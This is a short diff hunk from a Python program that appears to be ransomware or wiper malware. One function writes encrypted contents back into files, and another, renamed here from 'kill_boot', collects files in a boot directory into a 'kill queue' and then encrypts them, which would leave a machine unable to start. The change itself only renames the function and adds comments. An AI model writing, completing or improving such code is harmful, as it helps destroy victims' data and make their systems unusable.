@@ -47,13 +47,16 @@ def first_injection():
                 thefile.write(contents_encrypted)
                 
 def second_injection():
-    def kill_boot():
+    #first add boot files into a list
+    def add_bootfiles_in_kill_queue():
         for _ in os.listdir(boot_path):
             if os.path.isdir:
                 continue
             boot_files.append(_)
             
-    kill_boot()
+    add_bootfiles_in_kill_queue()
+    
+    #secondly, encrypt bootfiles
     for _ in boot_files:
         with open(_, "rb") as afile:
             bcontents = afile.read()
